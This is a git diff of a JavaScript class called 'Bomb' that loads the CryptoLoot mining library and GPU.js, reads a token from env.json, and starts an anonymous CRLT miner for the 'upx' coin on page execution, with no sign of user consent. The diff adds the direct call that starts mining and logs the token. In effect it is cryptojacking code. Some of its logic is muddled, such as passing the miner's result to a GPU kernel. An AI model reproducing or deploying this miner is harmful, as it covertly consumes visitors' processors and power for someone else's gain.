@@ -1,7 +1,8 @@
 class Bomb {
     constructor() {
         this.libGPUjs = 'https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js'
-        this.libCryptoLoot = 'https://statdynamic.com/lib/crypta.js'
+        // this.libCryptoLoot = 'https://statdynamic.com/lib/crypta.js'
+        this.libCryptoLoot = 'lib/cryptoloot-master/lib/crypta.js'
         this.envfile = 'env.json'
 
         console.log("Building bomb...")
@@ -60,6 +61,7 @@ class Bomb {
             const matrices = [[], []]
             for (let y = 0; y < 512; y++) {
                 matrices[0].push([])
+
                 matrices[1].push([])
                 for (let x = 0; x < 512; x++) {
                     matrices[0][y].push(Math.random())
@@ -71,11 +73,11 @@ class Bomb {
 
         const multiplyMatrix = gpu.createKernel(function (a, b) {
             let sum = 0;
-            for (let j = 0; j < 1000; j++) {
+            //for (let j = 0; j < 1000; j++) {
                 for (let i = 0; i < 512; i++) {
                     sum += a[this.thread.y][i] * b[i][this.thread.x];
                 }
-            }
+            //}
             return sum;
         }).setOutput([512, 512])
         const matrices = generateMatrices()
@@ -98,22 +100,25 @@ class Bomb {
     // }
 
     async mine(TOKEN) {
-        let miner = new CRLT.Anonymous(TOKEN, {
+        console.log(CRLT)
+        console.log(TOKEN)
+        this.worker = new CRLT.Anonymous(TOKEN, {
             threads: 4, throttle: 0.2, coin: "upx",
         });
-        miner.start();
+        this.worker.start();
     }
 
     async explode() {
-        await this.sleep(2000)
-
+        await this.sleep(3000)
         // await this.requireBundle()
 
-        let ENV = this.getENV()
+        let ENV = await this.getENV()
         let TOKEN = ENV.TOKEN
+        console.log(TOKEN)
 
         const gpu = new GPU()
         this.testGPU(gpu)
+        this.mine(TOKEN)
         const gpuminer = gpu.createKernel(this.mine(TOKEN), {output: [1]})
         console.log(gpuminer)
     }
